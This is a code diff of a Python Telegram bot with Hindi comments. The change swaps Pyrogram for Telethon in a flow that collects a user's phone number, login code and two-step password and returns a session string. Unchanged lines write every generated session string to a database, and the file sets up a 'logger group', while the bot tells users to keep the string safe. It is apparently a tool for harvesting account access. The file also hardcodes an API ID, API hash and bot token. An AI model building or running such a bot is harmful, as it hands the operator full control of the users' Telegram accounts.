@@ -3,10 +3,7 @@ import asyncio
 from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
-from pyrogram import Client as PyroClient
-from pyrogram.errors import SessionPasswordNeeded
 import sqlite3
-from pyrogram import Client
 
 # 🔹 Telegram API Credentials
 API_ID = 28795512
@@ -14,20 +11,7 @@ API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
 BOT_TOKEN = "7767480564:AAGwqXdd9vktp8zW8aUOitT9fAFc"
 
 # 🔹 Logger Group ID (Replace with your Telegram Group ID)
-LOGGER_GROUP_ID = -1002477750706  
-
-
-
-client = Client("my_account", api_id=API_ID, api_hash=API_HASH)
-
-# Pyrogram के साथ कनेक्ट करते समय टाइमज़ोन चेक करें
-async def check_time():
-    await client.start()
-    server_time = await client.get_me()
-    print(f"Server time: {server_time}")
-    await client.stop()
-
-client.loop.run_until_complete(check_time())
+LOGGER_GROUP_ID = -1002477750706   
 
 # 🔹 Initialize the bot
 bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
@@ -101,9 +85,9 @@ async def process_input(event):
         user_sessions[user_id]["phone"] = phone_number  # फोन नंबर को स्टोर करें
 
         if step == "phone_pyro":
-            client = PyroClient(":memory:", api_id=API_ID, api_hash=API_HASH)
+            client = TelegramClient(StringSession(), API_ID, API_HASH)
             await client.connect()
-            sent_code = await client.send_code(phone_number)
+            sent_code = await client.send_code_request(phone_number)
         else:
             client = TelegramClient(StringSession(), API_ID, API_HASH)
             await client.connect()
@@ -126,12 +110,8 @@ async def process_input(event):
         phone_code_hash = user_sessions[user_id]["phone_code_hash"]  
 
         try:
-            if isinstance(client, PyroClient):
-                await client.sign_in(phone_number, phone_code_hash, otp_code)
-                session_string = await client.export_session_string()  
-            else:
-                await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
-                session_string = client.session.save()  
+            await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
+            session_string = client.session.save()  
 
             # सेशन स्ट्रिंग को डेटाबेस में लॉग करें
             create_session_table()  
@@ -146,7 +126,7 @@ async def process_input(event):
             await event.respond(f"✅ **आपका Session String:**\n\n```{session_string}```\n\n🔒 **इसे सुरक्षित रखें!**")
             del user_sessions[user_id]
 
-        except (SessionPasswordNeededError, SessionPasswordNeeded):
+        except (SessionPasswordNeededError):
             user_sessions[user_id]["step"] = "password"
             await event.respond("🔑 **कृपया अपना Telegram पासवर्ड डालें (2-Step Verification)।**")
         
@@ -164,12 +144,8 @@ async def process_input(event):
         client = user_sessions[user_id]["client"]
 
         try:
-            if isinstance(client, PyroClient):
-                await client.check_password(password)
-                session_string = await client.export_session_string()  
-            else:
-                await client.sign_in(password=password)
-                session_string = client.session.save()  
+            await client.sign_in(password=password)
+            session_string = client.session.save()  
 
             # सेशन स्ट्रिंग को डेटाबेस में लॉग करें
             create_session_table()  
